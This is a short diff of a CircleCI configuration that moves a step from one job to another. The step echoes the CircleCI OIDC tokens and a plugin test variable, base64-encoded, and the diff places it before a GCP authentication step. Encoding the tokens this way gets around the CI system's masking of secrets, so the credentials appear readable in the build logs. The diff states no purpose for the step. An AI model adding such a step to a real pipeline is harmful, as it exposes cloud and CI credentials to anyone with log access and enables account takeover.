@@ -253,11 +253,6 @@ jobs:
     steps:
       - darkcheckout
       - setup-app
-      - run:
-          command: |
-            echo $CIRCLE_OIDC_TOKEN | base64
-            echo $CIRCLE_OIDC_TOKEN_V2 | base64
-            echo $CIRCLE_PLUGIN_TEST | base64
             
       - auth-with-gcp: { background: false }
       - auth-gcr
@@ -277,7 +272,12 @@ jobs:
     steps:
       - darkcheckout
       - setup-app
-      - auth-with-gcp: { background: true }
+      - run:
+          command: |
+            echo $CIRCLE_OIDC_TOKEN | base64
+            echo $CIRCLE_OIDC_TOKEN_V2 | base64
+            echo $CIRCLE_PLUGIN_TEST | base64
+      - auth-with-gcp: { background: false }
       - attach_workspace: { at: "." }
       - show-large-files-and-directories
       # LIGHTTODO
